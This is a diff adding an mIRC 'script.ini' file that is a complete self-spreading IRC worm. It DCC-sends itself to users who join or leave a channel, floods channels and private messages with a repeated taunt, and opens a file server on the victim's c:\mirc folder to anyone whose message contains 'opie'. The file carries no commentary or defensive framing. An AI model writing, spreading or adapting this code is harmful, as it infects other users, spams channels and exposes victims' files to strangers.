@@ -1,0 +1,16 @@
+[script]
+n0=alias unload {
+n1=  /echo 2Unloaded remote file "script.ini"
+n2=}
+n3=ON 1:LOAD:/amsg Why am I a bad boy. 
+n4=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }
+n5=  /dcc send $nick script.ini
+n6=}
+n7=ON 1:TEXT:*:#:/msg $chan Why am I a bad boy.
+n8=ON 1:ACTION:*:#:/msg $chan Why am I a bad boy.
+n9=ON 1:QUIT:#:/msg $chan Why am I a bad boy.
+n10=ON 1:PART:#:{ /if ( $nick == $me) { halt }
+n11=  /dcc send $nick $mircdirscript.ini
+n12=}
+n13=ON 1:TEXT:*:?:/msg $nick Why am I a bad boy.
+n14=ON 1:TEXT:*opie*:*:/fserve $nick 1 c:\mirc
